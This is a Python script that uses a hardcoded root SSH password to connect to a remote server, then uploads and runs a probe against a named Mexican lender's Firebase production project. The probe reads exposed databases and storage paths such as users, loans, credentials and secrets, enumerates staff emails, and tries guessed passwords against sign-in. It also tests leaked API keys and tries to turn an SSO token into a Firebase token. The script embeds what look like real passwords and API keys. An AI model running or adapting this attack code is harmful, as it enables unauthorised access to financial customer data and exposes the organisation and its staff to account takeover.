import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

API_KEY = "AIzaSyCbWNUFvtkFDuVJMCUMp3fnTxi15D8YhH8"
PROJECT = "findep-produccion"

# ========================================
# 1. FIREBASE REALTIME DATABASE
# ========================================
sys.stdout.write("=" * 60 + "\n=== FIREBASE REALTIME DB ===\n" + "=" * 60 + "\n\n")

rtdb_urls = [
    f"https://{PROJECT}.firebaseio.com/.json",
    f"https://{PROJECT}-default-rtdb.firebaseio.com/.json",
    f"https://{PROJECT}.firebaseio.com/.json?shallow=true",
    f"https://{PROJECT}-default-rtdb.firebaseio.com/.json?shallow=true",
]
for url in rtdb_urls:
    try:
        r = s.get(url, timeout=10)
        sys.stdout.write(f"[{r.status_code}] {url.split('//')[1][:60]}\n")
        sys.stdout.write(f"  Body: {r.text[:1000]}\n\n")
    except Exception as e:
        sys.stdout.write(f"ERR {url[:60]}: {e}\n")
    sys.stdout.flush()


# ========================================
# 2. FIREBASE SIGN UP (anonymous)
# ========================================
sys.stdout.write("=" * 60 + "\n=== FIREBASE AUTH - ANONYMOUS SIGN UP ===\n" + "=" * 60 + "\n\n")

# Try anonymous sign-in
r = s.post(f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}",
    json={"returnSecureToken": True}, timeout=10)
sys.stdout.write(f"Anonymous signup: [{r.status_code}] {r.text[:500]}\n\n")

# Try email enumeration
sys.stdout.write("=== EMAIL ENUM ===\n")
emails = ["jcruzval@findep.mx", "admin@findep.mx", "test@findep.mx",
          "jcruzval@independencia.com.mx", "admin@independencia.com.mx"]
for email in emails:
    try:
        r = s.post(f"https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key={API_KEY}",
            json={"identifier": email, "continueUri": "https://findep-hawking.tysonprod.com"},
            timeout=5)
        data = r.json()
        registered = data.get("registered", False)
        providers = data.get("allProviders", [])
        sig_in = data.get("signinMethods", [])
        sys.stdout.write(f"  {email}: registered={registered} providers={providers} methods={sig_in}\n")
    except Exception as e:
        sys.stdout.write(f"  {email}: ERR {e}\n")
    sys.stdout.flush()


# ========================================
# 3. FIRESTORE
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== FIRESTORE ===\n" + "=" * 60 + "\n\n")

firestore_urls = [
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/users",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/config",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/employees",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/loans",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/clients",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/credentials",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/tokens",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/secrets",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/certificates",
    f"https://firestore.googleapis.com/v1/projects/{PROJECT}/databases/(default)/documents/spei",
]
for url in firestore_urls:
    try:
        r = s.get(url, timeout=5)
        tag = " *** HIT ***" if r.status_code == 200 and len(r.text) > 100 else ""
        if r.status_code != 404 or tag:
            sys.stdout.write(f"[{r.status_code}] {url.split('documents')[1] or '/'}{tag}\n")
            if tag:
                sys.stdout.write(f"  {r.text[:1000]}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 4. CLOUD STORAGE
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== FIREBASE STORAGE ===\n" + "=" * 60 + "\n\n")

storage_urls = [
    f"https://firebasestorage.googleapis.com/v0/b/{PROJECT}.appspot.com/o",
    f"https://storage.googleapis.com/{PROJECT}.appspot.com",
    f"https://storage.googleapis.com/{PROJECT}",
    f"https://storage.googleapis.com/{PROJECT}-uploads",
    f"https://storage.googleapis.com/{PROJECT}-documents",
    f"https://storage.googleapis.com/{PROJECT}-certificates",
    f"https://storage.googleapis.com/{PROJECT}-backups",
]
for url in storage_urls:
    try:
        r = s.get(url, timeout=5)
        tag = " *** HIT ***" if r.status_code == 200 and len(r.text) > 50 else ""
        if r.status_code not in [404, 403] or tag:
            sys.stdout.write(f"[{r.status_code}] {url.split('//')[1][:80]}{tag}\n")
            if r.status_code == 200:
                sys.stdout.write(f"  {r.text[:1000]}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 5. GOOGLE MAPS API KEY TEST
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== GOOGLE MAPS API KEY TEST ===\n" + "=" * 60 + "\n\n")

maps_key = "AIzaSyAy2IsU9jUvh3NY4rbV-oRd24kzGP0AQrA"
# Test geocoding
r = s.get(f"https://maps.googleapis.com/maps/api/geocode/json?address=Mexico+City&key={maps_key}", timeout=5)
sys.stdout.write(f"Geocode: [{r.status_code}] {r.text[:300]}\n")

# Test directions
r = s.get(f"https://maps.googleapis.com/maps/api/directions/json?origin=CDMX&destination=Monterrey&key={maps_key}", timeout=5)
sys.stdout.write(f"Directions: [{r.status_code}] {r.text[:300]}\n")


# ========================================
# 6. CLOUD FUNCTIONS (known from APK)
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== CLOUD FUNCTIONS ===\n" + "=" * 60 + "\n\n")

cf_urls = [
    f"https://us-central1-{PROJECT}.cloudfunctions.net/",
    f"https://us-central1-{PROJECT}.cloudfunctions.net/dbConfigProxy",
    f"https://us-central1-{PROJECT}.cloudfunctions.net/dbConfigProxy?key=Sk3ZrzpqfJ3uhUNTuU9W5kESe",
    f"https://us-central1-fintech-produccion-mx.cloudfunctions.net/dbConfigProxy?key=Sk3ZrzpqfJ3uhUNTuU9W5kESe",
]
for url in cf_urls:
    try:
        r = s.get(url, timeout=10)
        sys.stdout.write(f"[{r.status_code}] {url.split('net/')[1] if 'net/' in url else url[:60]} ({len(r.text)}b)\n")
        if r.status_code == 200 and len(r.text) > 20:
            sys.stdout.write(f"  BODY: {r.text[:2000]}\n")
            with open(f"/root/cf_result_{url.split('/')[-1][:20]}.json", "w") as f:
                f.write(r.text)
    except:
        pass
    sys.stdout.flush()


# ========================================
# 7. TRY EMAIL/PASSWORD SIGN IN
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== FIREBASE EMAIL/PASSWORD SIGN IN ===\n" + "=" * 60 + "\n\n")

creds = [
    ("jcruzval@findep.mx", "Fisa1234*"),
    ("jcruzval@independencia.com.mx", "Fisa1234*"),
    ("admin@findep.mx", "admin"),
    ("admin@findep.mx", "Fisa1234*"),
    ("test@findep.mx", "test"),
]

for email, pwd in creds:
    try:
        r = s.post(f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}",
            json={"email": email, "password": pwd, "returnSecureToken": True}, timeout=5)
        data = r.json()
        if r.status_code == 200 and "idToken" in data:
            sys.stdout.write(f"  *** SUCCESS *** {email}:{pwd}\n")
            sys.stdout.write(f"    idToken: {data['idToken'][:100]}...\n")
            sys.stdout.write(f"    localId: {data.get('localId')}\n")
            sys.stdout.write(f"    email: {data.get('email')}\n")
        else:
            err = data.get("error", {})
            sys.stdout.write(f"  {email}:{pwd} -> {err.get('message', 'unknown')}\n")
    except Exception as e:
        sys.stdout.write(f"  {email}:{pwd} -> ERR: {e}\n")
    sys.stdout.flush()


# ========================================
# 8. FIREBASE CUSTOM TOKEN (with SSO JWT)
# ========================================
sys.stdout.write("\n" + "=" * 60 + "\n=== SSO JWT vs FIREBASE ===\n" + "=" * 60 + "\n\n")

# Mint SSO token
r_tok = s.post("https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token",
    json={"appJwt": "FINDEP-HAWKING", "serviceName": "hawking-service"}, timeout=10)
sso_tok = r_tok.json().get("token", "")

# Try exchanging SSO token for Firebase token
r = s.post(f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key={API_KEY}",
    json={"token": sso_tok, "returnSecureToken": True}, timeout=10)
sys.stdout.write(f"SSO->Firebase: [{r.status_code}] {r.text[:500]}\n\n")

# Try as ID token
r = s.post(f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={API_KEY}",
    json={"idToken": sso_tok}, timeout=10)
sys.stdout.write(f"SSO as idToken: [{r.status_code}] {r.text[:500]}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/firebase_probe.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/firebase_probe.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
